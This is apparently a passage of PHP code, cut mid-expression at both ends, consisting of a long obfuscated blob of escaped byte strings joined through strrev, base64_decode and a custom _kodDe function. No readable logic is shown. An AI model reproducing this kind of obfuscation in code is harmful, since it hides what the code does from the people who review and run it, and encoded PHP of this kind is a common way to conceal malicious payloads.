dd\x62\x6d\x55\x56\x76\x27\xa0\x12\x54\xbb\xee\xed\x2d\x6b\xd9\x82\xd6\xaa\x94\x2a\x49\x34\x32\xb0\x52\x6b\xc0\x68\x6e\x18\x9a"."\126\45\205\243\36\245\120\261\154\157\131\107\304\311\100\33\40\14\162\70\343\355\306\353\312\320\323\336\70\242\341\0\236\333\64\117\101\250\243\260\64\12\355\112\44\172\325\160\47".strrev('÷ÒtÍ†UhŸnF^˜æ½€*úƒÕÈÂúÑy×’¯3(‚9µ–ZÛf‚ì wjB{¤Ú')."\xb1\x24\x9c\x39\x8e\x8\xd\xcb\x8c\xa7\xbb\x64\x7b\x63\x5a\x31\x8b\xc7\x27\x39\x61\xeb\x96\x9b\x54\xb5\xa3\x2d\xdd\x97\xa1\x8b\xd9\x97\xd4\x33\x66\x19\x7a\x63\x8d\x66\x9d\x73\x11\xd1\x8b\x59\x3b".strrev('×Š–qü¯–X´åfÊNÍzc{Ï_Á­gD"(€Ä'."\r".'¬Lí51Bkb‡êÇ')."\113\213\204\127\342\261\353\360\132\50\223\127\316\305\352\216\30\5\3\167\317\346\51\144\260\21\173\260\22\32\344\47\175\156\33\260\146\67\14\244\347\64\172\321\377\263\33\373\7"."\72\174\263\7\227\373\15\121\306\337\354\153\126\132\232\26\50\275\210\137\61\264\274\2\235\256\312\321\244\104\127\71\207\105\40\174\321\54\352\237\60\70\170\303\223\50\203\153\130"."\51\60\26\132\335\27\212\47\324\356\120\242\53\332\1\137\17\5\40\24\61\351\312\146\275\355\247\77\203\200\0\203\364\107\65\254\116\151\347\301\121\116\241\124\63\71\204\46\243".base64_decode('W2dkGGY+XNCy0j6gOrcJHMOJ3QI5EJatNdJ8H0HRLt3I5mDADFxdysybZS2PqSdbOA==').base64_decode('OqNoWQMoWilfQTjjx19I5CqFJBB9xDZmdVtwZdYEYl0KbHNDO6Qd7nBsYRDzq3ieBw==')."\174\245\142\266\161\46\324\245\266\314\157\302\0\100\121\350\42\142\117\53\172\365\30\370\122\46\132\24\335\332\260\336\212\73\5\44\146\11\201\262\210\104\173\226\340\355\242\315\275"."\xa6\xf0\x3c\xe5\x7d\x5\x54\x9\xa9\x33\x68\xf2\xd\x8e\x1e\x0\x96\x38\xb7\xb\x45\x2f\x97\xcd\xf2\xb1\x90\x83\x84\x15\xb2\xe7\xe0\x79\x83\xca\x6d\xbe\x83\x5b\x68\xf9\xb0\x70\xce\xe4\x3b\xbe\x59"."\206\120\253\37\372\75\253\245\223\355\207\376\370\134\364\127\154\176\151\263\240\261\255\204\154\2\172\232\356\2\24\64\333\221\322\245\153\202\215\261\313\266\211\241\145\107\26\204\117".strrev('‘ñkâÇ¶ñ%C†0pTâ,£†JcÆ†È&Ò6Îœ…Ã:óÖ™ZÆÛÂ©4Íğ9').strrev('$N\'´`ÔD‹ìêŠÒ#ƒUŠJ†:Ì<­nÍB"«3Ö[Ş"û‚Qî4y‚/3Şğ'."\0".'B')."\x14\xb2\x36\x16\x4e\x84\xd8\xa\xe\x74\xa8\x81\x60\x2f\x8d\x71\x9e\x84\xd0\xe0\xea\xd\x96\x42\x46\x5b\x60\x92\x51\x23\xfc\x82\x13\x40\x9b\x5a\xc9\x2c\x5a\xba\x37\x5\x25\xc4\x79\xa5\x2a\x29\x2d"."\66\112\240\263\142\163\165\355\227\343\136\255\60\351\55\40\22\340\345\315\163\262\51\12\154\240\224\333\11\303\64\211\375\17\17\36\132\205\214\77\352\215\306\241\300\162\14\105\74"."\152\222\57\226\336\76\110\52\110\50\262\62\4\300\351\200\125\71\15\70\317\300\332\70\333\273\52\50\177\331\230\324\104\227\226\263\366\260\216\24\362\202\345\165\366\312\53\146\36".strrev('zÏjCF"ñlÍM-ÍXDu–§šÌmÆy¬2è=!}t(ù–]ãzÕÛÏ9U')."\x6f\xc1\x8b\x6b\xc1\x43\xe6\x6b\x6a\x6a\x62\x75\xcd\x59\xa0\xe4\x10\x55\x2\xf4\x35\x8b\x69\x32\x2d\xec\x9c\x51\x49\xd\xb3\x15\xa2\xa5\x18\xcf\x87\x8f\xc9\x96\x77\xcc\x60\x4\x75\x26\x67\x8f\x67"."\126\243\313\114\347\326\1\125\124\10\157\247\152\51\374\61\25\325\150\127\54\171\150\320\72\112\243\102\6\143\145\51\124\313\147\321\50\333\271\202\14\24\63\115\343\72\345\260\370"."\144\361\121\304\143\133\153\67\143\353\36\61\127\23\154\313\256\325\206\165\265\332\260\316\325\206\165\325\155\240\40\313\310\26\121\57\331\236\224\350\12\367\254\122\273\243\35\241\210".base64_decode('Gu5BW3CiGt7X2xFgK1WGt0cTXQ5oH9qE1wQiYXf20LpwPBGvmYRgfSFXSke72hsLdQ==')."\206\327\361\150\147\70\24\351\210\253\301\100\260\113\344\351\11\164\207\370\316\253\347\323\226\337\231\137\105\334\104\234\213\73\324\121\54\272\141\130\250\72\44\14\52\73\73\253\202".base64_decode('WCDGUocBh+5igRHpicqQtMJ4HX6oKrDdoKABjdQYR9hAfxqVQFyxSyqn+8kJHiTdYA==')."\x71\xb4\x95\xc1\xf7\x15\xe0\x6c\xaa\x5a\xa0\xe2\x3c\xed\x12\xfb\x59\x1b\x10\xc8\xd8\x9c\xaf\x71\xc5\x11\x95\x13\x69\x68\x6\x2\x44\x32\x85\x30\x81\xcc\x8\x7c\xc6\x40\x34\xb3\x6c\x7\x58\x73\x32".base64_decode('QiqkRntDsQCWKalrY9GelVBgLKezBoRh+BvYQQNES7bYetApQWMyBjHoQyYbyk305w==').base64_decode('eCAF6EgKlKXIRj2Jd2HGRbFABpE9toOaFf61pGnmGUFGjDDfGbhoashiSDLO9pQ5nA==').strrev('ıçÀlÄu‹'."\0".'s}ùpØ4Ù1ÎFqBÆ&‚|™‡6Äh±b„#a&4Y†Tz…WFê”')."\x27\xd\x8c\xcd\x69\xe8\xf7\xce\xf1\xd\xa2\x40\xe3\xec\x15\x34\xa\xb1\x1\x9f\x23\xca\x18\xb8\x4a\x99\x97\xc6\xe7\x83\x6\x6b\x79\x63\xeb\x80\x7f\xc0\xdf\xb0\xbc\xb5\x3f\xe0\x9d\xd4\xbc\x93\x4d"."\336\305\336\101\304\366\65\316\1\300\340\306\26\317\274\315\70\3\312\270\374\270\101\364\323\66\260\174\326\200\367\370\157\156\130\321\77\60\130\337\72\347\330\1\337\161\3\143\203"."\xb3\x1b\x97\xb3\xef\xa4\x2a\x65\xc4\x59\x32\x8a\x85\x9a\x9a\x9e\xd3\x80\x9a\x84\xce\xd\x3c\x4b\x91\xec\x6d\x52\x6\x96\x30\x69\x94\x4\x74\xe3\x82\xcd\xc\x8e\xe6\x50\xcf\x8a\x12\xfd\xde\x81\x39".base64_decode('g8ulchLI/S1ESdFGm+P5At4Tcc94UbzuAT8qxZTYlvC6SGopoAOIRgqu3S5zmZXzRA==')."\xbb\x71\x16\xfd\xdd\xcc\x26\x32\xab\x8f\xf3\xfd\x2b\x63\x94\x1\x3b\x2b\x45\x63\x84\x71\xcd\x45\x7d\x4\x2\xa6\xcd\xf0\x3b\xa9\xdb\x63\x3a\x43\xf\x4\x77\xc4\x11\x72\x30\xba\x8f\x92\xa4\x58\x5e"."\332\63\210\160\101\332\156\31\223\127\122\361\111\142\214\307\320\66\2\363\64\15\162\133\51\255\244\307\245\36\252\152\42\320\36\11\251\214\302\0\45\146\161\102\25\333\271\100\33".strrev('<ªr‡!Ğ¦[i\\'."\r".' «cG ®0”ªßl‰[ÜåB¼‘­ò°îNJ¬âRFTPMu')."\x25\x8d\x31\x84\x58\xf2\xa4\x8b\x45\x8f\x29\x14\xb4\xa9\x24\x66\xc8\x42\xac\x33\x63\x5e\xfd\xd\x3\x3\x95\x7e\x3d\x3d\xd8\x8f\x10\x5f\xf3\x66\x6\x37\xce\xdd\xdc\xc8\x8e\xb3\xfe\x1\xf4\x87\x45"."\x2\x35\xa4\xcc\x2a\xa7\x86\x2a\x62\xc4\x7c\xb8\x1d\x5c\xac\xe8\x88\xf0\x64\x1a\x35\xcb\x9c\x3\x2e\x39\x4e\x8b\xb6\x69\x6b\x79\x47\x15\x9\xc\x61\xa4\x89\xf1\x51\x20\x60\xa3\xb3\x1d\x11\x14\xb"."\363\154\222\170\236\220\323\36\56\320\342\214\220\44\37\306\45\342\272\355\343\71\74\122\242\212\342\216\253\222\266\72\106\354\213\150\71\5\245\255\216\212\71\343\344\154\351\220\351"."\133\272\126\116\345\72\53\371\274\315\217\254\171\143\30\276\0\153\5\256\30\274\260\33\314\251\125\264\323\54\63\351\320\154\150\106\335\354\132\31\303\305\242\231\116\312\250\46\66"."\xd9\x95\x1\xc4\xce\x24\x94\x6\x26\xe\x57\xc2\x3d\x4a\x7b\x34\x1a\x9\x5\x7a\x14\xbc\x9f\xc3\x3e\x84\x98\x85\x78\xa8\x37\x80\x36\x31\x2c\x67\x8a\x27\x42\x20\xa1\xf\x77\x78\x59\xbd\xeb\xbc\xec".base64_decode('oMwDBgy7WaJ8o26r6Ow5zOZSPmrjM4QHH3g9mLfwoFZ78BnZI05oHiFu9owa+hgJ8A==')."\xd3\x93\x7\xe\x55\x1e\x71\xba\x87\x60\xb8\xc3\x63\x58\x1d\xe4\x70\x48\x3e\x40\x92\x58\x13\xd0\xa9\x1a\x1d\x6e\xf2\xda\x84\x87\x36\x27\xa2\x8f\xea\x79\xf\x3b\xf7\x7b\x58\x1b\x3d\x4c\xec\xe1\x21"."\342\212\16\150\126\37\132\116\320\54\22\104\124\63\347\301\10\204\361\327\43\4\340\36\164\30\327\313\44\13\14\214\70\127\172\304\231\323\223\55\233\225\122\57\373\246\24\243\315".strrev('\\AÒ6“Jpùê¬™O¥ªNànïã!½ÚÎÔl+@©GŠI0öÓLÄ3h€').base64_decode('tZntco48RJjDuU884CK0RixU3IFODa5aaLVymCNo0YmoQtYtbjkEr+uWFrjvP/BHEw==')."\132\66\56\175\316\326\262\354\133\230\130\241\324\51\263\322\160\114\117\115\244\204\370\241\103\22\152\70\143\25\124\103\134\313\270\272\345\41\353\250\326\32\250\75\307\34\257\371\224"."\x4c\x9f\x36\x8d\x8d\x31\x43\x76\x3e\xbf\x8e\x35\xf2\xe9\xab\x13\xfa\x45\x48\x60\xb4\x24\x98\x8\xda\x58\x4c\x86\xe3\x68\x53\xeb\xcc\xb3\x41\x69\x91\x93\x81\x0\x7b\x9c\x31\xbc\xb8\x7c\x84\x20\x93"._kodDe('KbmAjC06QZI32v4deVOXnnsnx8MfhaHB9NeXkJ2MAjvHOscgUR6b+Fnpl88Qzd/fPBE=').base64_decode('xQWaOBvhYVGlGvHwcMuDgNGBdF/sTgwUFZthBTg/zYIzGJbrQUhnMDG1Ml5K5EYAWA==')."\273\34\337\305\121\261\246\30\112\50\370\3\36\211\127\301\44\305\53\126\207\24\165\16\271\13\43\135\133\50\36\242\136\243\70\141\24\343\106\241\224\257\202\212\135\130\60\1\170"."\x71\x8b\x18\xc5\xca\xa9\xc2\x74\x13\xc1\x22\x1a\x5a\xbf\x7\xae\xeb\x3c\x79\xa3\x38\x2c\x6d\xd0\x42\x2\x87\x5a\x8f\x8b\x4a\x6d\x87\x9a\x5c\x2d\x87\x8a\xa4\x2c\x62\x4\x58\xd4\xb1\xba\x1\xff\x73".base64_decode('WlkMLaNJmDDw/BbOIqJStow2KtgVRxmJslj2BOuLHHRWSqMdHvLbhboiL14+WZiqsA==').base64_decode('TJQgIcoQQSOHfkhHEqYHi4vRD93U2T0uycRWQaXQAeJnHF6DyAHj0tDwNzByAqyFKg==')."\11\10\70\71\162\62\7\264\45\1\116\354\21\367\236\107\173\133\331\207\127\314\112\274\103\261\61\241\304\116\306\300\270\216\372\11\325\213\32\342\125\151\162\156\41\371\303\304\137"."\154\26\154\54\305\202\163\316\71\15\145\105\203\360\160\252\325\355\300\370\134\73\336\131\66\71\253\313\367\171\167\246\40\71\113\362\353\170\327\336\54\215\207\203\237\250\2\111\145"."\334\234\205\13\352\212\142\156\243\306\266\103\101\354\206\100\113\27\214\242\257\114\267\63\37\72\41\200\122\205\247\111\142\276\4\325\331\110\157\141\140\373\333\354\232\147\333\64\321"."\xb1\xb3\xec\x2b\xa3\x2f\x8b\x6\x49\x14\xf\xc8\x5\xb9\x61\xc7\xbb\xa2\xcc\x32\xf0\x5a\x2c\x94\x20\xd1\x6e\x27\x67\xc4\x4a\xc6\x4b\x1a\x23\xd9\x9c\x6b\x63\xd8\x4b\xce\x18\x15\x41\x46\x49\x93\x25"."\x8d\x7\x12\x8f\x70\xe\x17\x13\x85\x50\xda\xb0\x31\x4\x2f\x33\x93\x5d\x5a\x88\x8c\x62\x9b\x14\x30\x99\x4e\x93\xed\xa6\x6a\x8a\xc5\x71\xc1\x33\xcb\x91\xd3\xc9\x22\x0\x70\x36\xd9\xc7\x7d\x82\xa3"."\251\255\73\222\62\113\60\357\222\32\125\301\34\325\45\240\317\262\315\222\110\221\242\64\131\112\22\225\112\271\370\124\220\26\241\125\224\46\174\260\30\62\222\27\312\222\103\64\135".base64_decode('qD58bPDJxDlQLjM0pd3E144IKIMwlYuzNVZrj6KVh0aFkhStCn/YRxe5T0uno+zqVQ==').base64_decode('DldnlQWKtSsiGmu8KilWO3sgnxc6Le74lEXo4pYLyZApi3WSEyy7QK4F42eXqflx9w==')."\325\252\223\40\117\315\247\114\101\312\304\64\326\216\243\35\71\230\63\212\72\223\263\144\214\262\125\213\62\375\77\146\210\253\107\36\257\220\251\320\5\247\111\242\147\254\254\71\252".base64_decode('ywcFLl8VlIhvzlUsB2z7UkS1HXxUjNQvLScHhqDlS8cDb0zhqM+aAmfd+XQmfSY0cA==')."\234\357\247\162\41\234\204\347\122\256\124\360\155\237\220\237\127\56\170\70\71\37\302\135\234\60\125\133\131\62\257\145\347\123\337\173\347\241\167\151\370\77\247\376\364\234\227\167\322"."\360\374\171\13\151\140\323\201\104\127\227\204\205\266\356\226\265\23\346\121\217\35\176\320\37\374\273\36\135\160\365\215\307\76\265\352\232\347\237\331\322\170\314\227\147\235\365\134\354"."\373\347\375\174\353\137\336\364\214\75\365\302\25\273\337\270\245\353\346\377\74\226\273\174\321\311\327\165\255\76\342\306\255\137\275\365\67\7\170\237\376\371\41\117\327\5\16\173\377".strrev('ğ<—m‹ô¼ï¯ÿo>ãÃëx_µóy4>7—âÿ|½ï]òø’İWÌ±ÙCÊÄÅ').base64_decode('sMez88avWTv98qMuTN6+c/HDldMffOQx37v1a4ZmdL/z8b+/87Dv5/Fl1zx6WUT5Sw==').base64_decode('x1/vmdF047b9lv2so1i/cPGM0YPvat7SfOa/c7/48eJF+dnH/b30/J6zl1x07SOhXw==').base64_decode('zX9pySnvNFx56ylvGN6P3q4fe+aLz826/ORDJr+wrLfzX/0/euzU0e1PPLbkipdHbw==').base64_decode('vfb49Q8eFH7z0VPemzF605aj/ddf+Nb3P3unuv9FgWOPPa/pznN2DX/9/aW/WnD1nQ==').strrev('Ìì½NÔùßk®‡ûÆWèQø.Îärw¸®çä–Ñs»¹år½—­æsšÑ|ÿ‹')."\37\175\366\220\346\273\206\156\212\375\166\325\254\277\164\351\257\255\316\175\270\363\243\362\271\107\224\357\175\370\264\360\275\373\267\165\277\261\377\325\47\55\274\172\301\255\251\301\135".base64_decode('jxzXeWXTybnEwNfGX55x2OZ9xx2bDD6297hH6o4pbH1kz37HHhHZcNDKg7/nGd11QQ==')."\162\341\231\117\355\270\250\356\365\337\46\267\375\361\372\5\273\346\175\373\260\314\314\145\247\55\370\361\323\271\327\316\332\270\337\113\73\266\175\157\332\365\243\207\235\66\143\354\214"."\xe6\x73\xe\xff\xe1\x67\x76\xfe\xe0\x73\xd7\x2f\x8e\xac\xf8\xf3\xc1\xdf\x78\xf8\xeb\xed\xe3\xcb\x92\xd6\x99\x5b\x8e\x6b\x9a\xf6\x42\x6c\x78\xe8\xcd\x13\xef\xf5\x5d\xdc\x5a\xfa\xe6\xe3\x3\x7f\xdc"."\xd9\x75\xf1\xaf\xbe\x7c\xcb\x65\xaf\xff\xfc\xed\x9e\x7d\xb7\x1d\x38\xbd\xff\x92\xe7\x57\xc\x9c\xf4\x98\x75\x90\x76\xd5\xf2\xbb\xfe\xd8\x7a\xc7\x55\xd6\x85\x2f\xdd\x9e\x5f\x55\x9e\x76\xc9\xbc\x47"."\237\354\73\344\374\7\176\31\271\145\117\361\230\366\302\115\127\137\367\317\360\350\321\201\25\327\255\177\173\333\325\137\32\365\144\57\333\63\143\337\121\323\236\370\354\173\323\16\13"."\335\277\257\365\320\33\374\115\207\235\260\260\160\261\357\117\73\236\352\371\356\266\357\324\315\120\236\274\350\13\117\34\230\272\140\347\360\237\177\365\374\353\333\36\373\374\71\153\137".strrev('Ş[‡ıy^«½ñ7«èİ|ÿgòåzèëìWƒcàuÒ¿—¶»CÆü:ÿÌàù‹àõ;')."\x3f\xbc\xe9\xc1\x73\xb6\xdf\xb3\xe2\xd4\x69\xa7\xdf\xda\xb4\xe4\xed\xcf\x5c\xf3\xb5\xd3\xa7\x37\x6d\x58\xf4\x82\x9d\xfc\x5d\xee\xf9\xe6\x5b\xce\xbc\xe7\x6b\xd7\x3d\x53\x3e\xfe\xac\x33\x8a\x7\xfe"."\xa3\xa1\xa2\x2f\xfb\xea\x99\x9e\xbb\x3b\x7a\x1f\xbe\xbb\xfd\xd5\x73\xdf\x4e\x9c\x32\x2b\xb3\xf8\x50\xff\xd9\xcb\x97\x7d\x3e\x3e\xd8\x36\x72\xd0\x93\x1b\x16\x44\x1e\xfd\xeb\xec\x2f\x1c\x70\xde\x87"."\335\157\74\374\223\337\35\23\217\165\237\164\142\362\214\367\176\270\356\363\247\154\333\166\177\346\222\374\141\147\67\35\172\172\250\356\304\347\277\72\177\303\175\77\274\353\365\241\207".base64_decode('Fvzh8P7Aruat8644/ytHB2+9aNdbB/z6/p1nfPvRr+w6cO73D7z3GP2g2zu716zb8Q==')."\xc1\xa3\xbf\xfd\xf3\xe3\x67\xbd\x3b\x37\x7b\xe3\x5\x23\x89\xd9\xfb\x9d\x34\x3c\xe3\xae\xfb\x86\x6e\xfd\xdd\x6b\x47\xff\xe8\x6f\xc7\xec\x3d\x7a\xe1\x4f\x7e\xaf\x6d\x5f\x78\xc2\xbe\x19\x5f\x9d\xf3"."\231\155\277\230\355\337\75\366\310\305\317\105\276\162\333\147\276\174\340\367\137\173\364\314\165\77\375\326\255\255\253\117\374\373\265\147\376\371\207\307\155\133\323\134\331\350\273\252\364"."\263\364\217\17\172\145\107\352\340\357\135\71\175\367\226\276\73\302\215\327\37\365\323\221\263\217\370\362\77\167\234\163\305\266\323\136\232\365\372\222\310\145\301\310\323\357\354\74\372"."\x95\x3f\x3c\xeb\xcb\x87\x32\x3f\x7c\xce\xf3\xcc\x71\xaf\xcd\x89\x7b\x1e\x6c\x78\xfa\xb6\xfe\x7d\xbb\x16\xcf\x7c\xf1\x89\xe1\x4c\x77\xfe\x91\xab\xde\x18\x9c\x5b\x8\x4e\xff\xe0\x2f\x2d\xfb\xfd\xe4"."\xc3\xa3\xeb\x46\xe\xbf\xaf\xe5\x6f\x9b\x3e\x4c\xbc\x32\x79\xf7\x1\xbf\x6e\xfe\xe3\xf1\x4d\x75\x67\x5f\x7c\xf6\x91\x7\x1c\x77\xfe\x96\x47\x6e\x8b\xfc\xcf\x89\xcf\x1c\x7f\xb0\xfa\xd8\xc1\xd3\x7e".base64_decode('WFzR3jSxMv9mf116/alHvr7zjEOWr84nHj/82kuPe3DODR9u/MLfb1ycuOYHZ6848A==')."\313\23\57\277\231\173\146\355\351\117\255\261\236\237\161\326\121\227\74\74\222\176\71\77\166\341\241\237\73\362\356\7\373\137\37\275\374\212\231\327\175\306\167\155\303\312\165\7\356"."\333\57\242\175\347\256\261\157\215\274\225\271\351\306\143\337\370\334\341\317\176\343\117\57\77\27\10\236\234\354\171\344\27\345\43\317\214\135\172\346\366\315\153\337\170\354\367\257\134"."\x31\x74\xfc\xa2\xbd\x3e\x33\xd9\xfa\xdf\x81\x23\xcd\xd9\xaf\xb6\xdc\x12\xdc\x6f\xec\xb0\xb1\x7d\xaf\xdc\x38\xe3\xa2\xe7\x3\xd7\xdf\x31\xf2\xfa\x82\x1b\xde\x7a\xe9\x99\xf7\x63\xb7\xdf\x7f\xfb\x45".base64_decode('6x+68KeH753e9fX8eTfc8acvXfueumz5x4/82qd+vPvdp+7curztow9+9sQTC82XHw==').strrev('ñ¶¿g¥î¹^÷ÓüÛ\\äê:íµiñı¹]÷;ór½\\·½İÿ~nWCÑø_ïŞôÚ').base64_decode('8HjXYfc8vvi7LZuil++v/PaFwOf++dQN19zzi9v8DdYBCz4zOPzz5gP+MO9bA8f/8Q==').base64_decode('ukNfNHfbz5516SXrbmj6/dkrF64LjXz9u+3TZ136xwNOP/2OCzpu8rX/pu2lS9p++Q==')."\xe0\xc5\xeb\x4f\xbe\xff\x9b\x1b\xbb\x6f\xdd\xb3\xf8\xb9\x86\xb\xb7\x9e\x37\xf7\xf5\xe1\x8f\x36\x7a\xaf\x5f\x3d\xff\xfd\xfa\xd7\x62\xd7\x4e\xee\xb8\xe1\xb2\x96\x19\x8b\x4f\x28\xff\xe8\xc2\xe6\x43"."\106\317\152\176\367\257\127\337\274\355\330\177\177\57\377\137\355\277\73\343\204\313\236\232\356\275\243\356\246\323\274\126\361\311\47\367\155\275\167\246\357\254\25\117\137\377\343\13\107".strrev(';ıÉû?Òêæ<?aÛû¦w1ôÿ>/½Íş~çìö]‡àÎñ<ş+áu?'."\r".'¡İwš').base64_decode('jjbXPn7nlR9bpee+OLqn/eZ1a2979W79kR8c3Xbs1vaTXvvHKz/tfPO5y77Y/8oDQw==')."\137\365\365\234\167\370\311\275\337\360\234\360\342\3\17\374\356\204\27\216\371\365\216\316\53\116\332\374\364\57\317\377\152\353\223\277\173\345\243\55\267\264\135\356\317\74\162\305\236"."\256\312\345\267\376\327\51\57\274\220\171\371\205\27\137\172\376\310\257\333\213\376\274\67\377\322\200\372\104\342\50\157\317\245\27\114\277\366\216\367\13\277\74\155\313\337\336\236\167"."\363\167\336\60\236\230\366\154\353\352\147\203\231\123\63\257\234\276\160\335\41\332\271\7\4\256\170\360\275\317\154\333\57\172\334\105\163\146\176\341\117\277\71\345\314\273\77\354\270"."\xe2\x2b\x2f\x7e\xf6\xd7\xe7\xfc\x79\xb0\xf2\xe8\xd0\xfd\xcf\xa8\x3\xc3\xbb\x56\xaf\xf8\xeb\xfc\x6f\xff\x7e\xf1\xc6\x33\xbe\x7b\xe0\x8a\x8e\xa7\x8f\xbc\x65\x7b\x76\x70\xda\x7f\xd7\xaf\xe8\xf8\xc3"."\363\321\35\173\7\43\327\316\64\66\236\177\364\216\311\103\256\373\326\337\256\337\327\244\234\367\112\353\151\366\237\237\375\362\241\13\117\177\166\147\171\350\301\317\27\257\270\173\333".base64_decode('tOnD0zd+J3fKMzvXrn5726FbB7dnv/abwdKiNxc//v1vv/NgU8eX/CfE7U4t9YfRoA==')."\xe7\x27\xf5\x3d\xef\xa7\x1f\xfa\xe7\xa2\xd3\x3e\xf7\xc2\xfb\xf\x6f\xd9\x7a\xc9\x55\xfb\x8e\xb2\x2\x2d\xbf\x3d\xf6\x94\x79\x87\x1f\xfc\xf0\xfe\xb9\xd7\xd6\x9f\x74\xee\x3\x8d\x57\xcc\x3c\xeb\x91"."\343\127\155\375\303\103\77\376\350\320\217\376\331\172\344\332\263\136\71\341\352\203\167\335\163\363\201\137\275\146\347\352\73\236\274\150\346\223\372\263\253\322\341\71\103\27\274\377\313"."\361\153\257\56\264\46\176\375\326\335\173\277\70\372\356\15\7\236\270\171\337\107\233\67\331\167\265\115\174\167\154\341\212\137\334\74\343\157\177\373\375\77\347\316\333\236\274\373\205"."\xe1\xa7\x6\x7e\x3f\xf0\xf5\x5b\x3a\x9f\xfa\xaf\xc3\xff\xfd\xe0\x9d\x29\x4f\xcf\x67\x7\x82\x6f\x5c\xf4\xcb\xfb\x3e\x3a\x67\x4d\x65\xb8\xf0\xef\x77\x52\xbf\xfa\xd5\x2d\xf\x3f\xfb\x5e\xef\x57\x5e".base64_decode('vOj2xODBvzi885qFt/zi6d1/+kHiuyd/9K87vxfdf4fy2tXbvnrX90/514rbvvzA6w==').base64_decode('K+xDTv3+0vj0C362dqm69TcTl+/qP3PN4w/suOZHXS/cvG7GbuXSl3YWF134y/TgPQ==')."\343\357\374\344\275\275\352\25\37\357\331\372\204\377\344\221\17\336\171\56\373\361\377\374\375\205\372\53\117\332\364\356\277\376\365\341\307\377\370\140\167\66\373\353\207\76\377\313\267"."\167\337\171\304\21\37\377\353\370\177\174\264\347\274\43\266\253\203\233\76\370\315\13\333\277\271\361\203\327\36\73\102\375\370\357\357\252\127\176\374\341\237\324\267\167\172\376\372\316".base64_decode('Qbcce2T7Vf71N+z5zVV7Xrpn4yuDyz5886Cde178e+edd9/54ssvvjXD3vjv/+498g==')."\xe8\x63\x8e\xfe\xd3\xc9\x6f\x7f\xe9\xec\xf9\x47\x7f\xfd\xb0\xdf\x4d\xb6\x84\x76\x9c\xfa\xd2\x91\xef\xdc\x78\x72\x8b\xea\x89\xbe\xb7\x25\x79\xd3\xfd\xb7\xaf\x7f\xe1\xe6\xcc\x5b\xff\x59\x91\x9b\xbd"."\xe9\x67\xcb\x77\x9e\x16\x3f\x78\xf0\xdb\xd9\xff\x9\x7c\x2d\xda\x77\xea\x67\xb7\xe\xad\x7c\x67\x56\xb1\x65\x47\x3a\x3f\x23\x97\x6e\xb4\xbe\x66\xef\xba\xec\x47\x8f\x6c\xf8\xd7\xf2\xc9\x73\xc6\x9b"."\x6f\xfc\xa\x33\x2c\x9a\xdf\xc\xb6\xf\xb\x5b\x40\x83\x6e\xf1\x5c\xd0\x54\x5a\xb4\x18\xd4\x72\x52\x85\xa2\x39\x66\x80\xa0\xa\xb2\xcf\x6f\x82\xec\xb\x16\x31\x69\x6e\x6e\xbc\x98\xcc\x3\x9f\xa"."\125\214\247\113\223\172\12\104\175\163\131\165\345\154\56\317\4\13\13\347\103\326\371\13\131\315\315\220\257\62\72\136\116\62\136\270\205\235\76\53\111\63\67\4\71\241\235\13\131".base64_decode('gxdAyblz4fZ3bDI3nB0HgYRZGs8PMyX4uQvgc/NYoaFRK1VkIsCUhfIyScb8FjZGiw==').strrev('T6™šJ™46¤ñüĞRGG”O`Ào¬sĞÆl‰åËáóµÎz2G]\\,ŒÖš0 ').base64_decode('YTI/OsRkx9C0efMXA5M9MZYrlDR2YJi0CuMgcZu7CLIsWMCGpQU+Ohdmah7UVtBSpQ==').base64_decode('ygSUy6UnJzLMDmYhm/pxO5OdHGJQVnBeC3xjdLiYHUlyIyW9qA2BhHruYnbvnrcqow==').base64_decode('Y8wihNUwmR6ykhWAtsyHSW1eBMlWuWhURuBMOK8J2j+BWpK0hDpYuZIDietINjWaZA==').strrev('$3i22¬abşCÙÇ6Åbù2œœidÅ³“îÄ95"kfĞy‚õ¡™ á@²›=$‡')."\147\263\304\26\311\142\230\256\261\234\155\31\51\50\74\71\72\224\311\32\40\51\315\214\331\343\205\62\104\26\54\204\202\315\55\60\304\225\61\123\57\226\330\331\57\235\315\24\64".strrev('yhøğÈ°ÊR³9tÃ-]¦Ög’9²é©¡sù£­8¾ÌÔ> ¿ƒ	¢aa…@').strrev('˜Q•K~†.æFBÄ(Â6L’W'."\r".''."\r".'¨Sb,$Ã™lEò›>o5ø¦u$n=.¨ñkF').base64_decode('6fLwZHYsDTg9lLEqkyZ8sLmJoe1C+LQxlkb9h9levHAxo07QDi1VyOms3sLQpFUpwg==')."\x8a\x5e\xc0\x16\x7d\x4b\xb\x5b\x83\xba\x56\xb1\x46\xe1\xb3\xc3\x85\xf1\x64\x26\x7\xa3\x6a\x19\xba\x3d\x3c\xa\x8\x3c\x51\x1e\x47\xa3\x34\xca\x88\x9\xc\x4b\x29\x67\x16\xb\x50\xf5\x50\x76\x2c".base64_decode('b5cgMlrOZiaLY4zkQMdH9fK4lZxkRGARw9ZKTh8BbE3b+YmRDIz/8KSd5h8dzxjJ0g==')."\20\127\307\36\33\35\141\352\22\103\71\153\70\233\7\364\152\141\64\13\65\70\127\111\17\263\276\344\206\106\312\360\345\41\335\314\215\16\3\52\264\60\114\111\347\262\251\174\251"."\xc2\x3e\x36\x62\x9b\x4c\x19\x8a\x6b\xac\xb6\x6b\xa9\x61\x26\x4d\x96\xd5\x3e\x99\x89\x9b\x51\xf4\x15\xb4\x22\xd7\xb6\xe9\x2\xd5\x90\x94\x6c\xe1\x20\x67\x18\xd6\x75\xa6\x26\xe\xa\x9\xb6\x50\xe7"."\0\65\123\200\33\5\135\110\303\351\235\3\53\51\316\375\130\350\42\51\204\340\150\134\256\45\125\264\245\144\24\163\244\306\121\217\271\12\12\125\156\363\341\26\372\344\256\256\57"."\60\35\335\32\67\231\40\1\266\254\61\263\14\103\66\154\246\123\171\263\222\166\324\232\116\72\352\344\120\46\250\160\247\144\246\200\243\172\34\212\332\14\346\30\254\44\231\64\125".base64_decode('jvjYcCelCaUieluzhn0y2CunGkXUinze57TQVckfGANqBWphteaiuPe2hqWBx6a1fQ==')."\275\152\42\20\137\45\151\0\142\323\117\206\116\252\120\312\227\272\45\152\220\306\121\236\101\347\20\60\14\331\267\375\276\335\347\135\264\347\302\37\357\71\347\266\335\367\236\277\357"."\266\37\357\176\340\102\24\175\365\236\163\167\337\366\203\327\56\335\362\352\75\347\274\172\317\267\366\235\176\327\133\367\237\275\373\274\355\373\116\175\140\367\266\33\167\137\167\372\253"."\xf7\x3d\xb0\xef\xa1\xd3\xf7\xde\xb8\xf5\xd5\x7b\x6e\xdd\xb3\xed\xcc\xdd\x5b\x76\xbc\x7a\xdf\x45\xbb\xcf\xb8\x6a\xf7\xe9\xe7\xed\x39\xff\x9c\x57\x1f\xd8\